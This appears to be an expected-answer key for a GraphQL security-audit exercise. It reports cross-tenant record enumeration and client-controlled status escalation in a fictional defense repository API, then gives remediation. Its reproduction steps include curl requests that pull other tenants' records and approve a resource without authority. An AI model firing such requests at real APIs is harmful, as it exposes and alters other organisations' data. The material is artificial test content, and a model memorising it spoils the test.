# Expected Response

## System
- Domain: Defense Industrial Base
- System: Aegis Vault Secure Repository
- Example ID: GQL-0056

## Priority Findings

### Finding 1: Cross-Tenant Bulk Defense Repository Enumeration + Client-Assumed Authority (Pattern 3.1)
**Severity:** Critical
**Category:** BOLA / Insecure Design

**Summary:**
The `bulkResourceLookup` mutation on `POST /graphql` returns defense repository records belonging to `tenant-9aa7` when queried by `tenant-f85e`. Per §5.0 (Pattern 3.1): "The client supplies price, role, or status fields that the resolver applies without server-side re-validation of the authenticated user's permissions." The bulk lookup also lacks per-ID ownership filtering, enabling mass enumeration of classified defense artifact records across tenant boundaries.

**Evidence from HAR:**
- Request: `POST https://api.aegis-vault-secure-r.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-f85e`
- Mutation: `bulkResourceLookup(ids: ["R-2056", "R-1056", "R-3056"]) { resourceId tenantId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-9aa7"`, `ownerId: "other-user-f85e9aa7"`, `sensitiveField: "CONFIDENTIAL-f85e9aa7"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-f85e9aa7`

**Root Cause (§4.0 RISK-GQL-056 + §5.0):** Resolver lacks tenant guard; client-supplied fields applied without server re-validation.

## Steps to Reproduce

### Step 1 — Bulk cross-tenant defense records (HAR)
```bash
curl -s -X POST https://api.aegis-vault-secure-r.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-f85e" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2056\", \"R-1056\", \"R-3056\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-f85e9aa7` from `tenant-9aa7`. **Secure:** FORBIDDEN for cross-tenant IDs.

### Step 2 — Status escalation via client-assumed authority
```bash
curl -s -X POST https://api.aegis-vault-secure-r.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-f85e" \
  -d '{"query": "mutation { updateResource(id: \"R-2056\", input: {status: \"approved\"}) { resourceId status } }"}'
```
**Vulnerable:** `status` updated without server-side role re-validation. **Secure:** FORBIDDEN.

## Remediation
1. Per-ID ownership filter in `bulkResourceLookup`.
2. Resolver tenant guard on `getResource`/`updateResource`.
3. Server-side re-validation of `status` field: assert caller has required role before applying.
4. Redis cache key `resourceId:tenantId`.
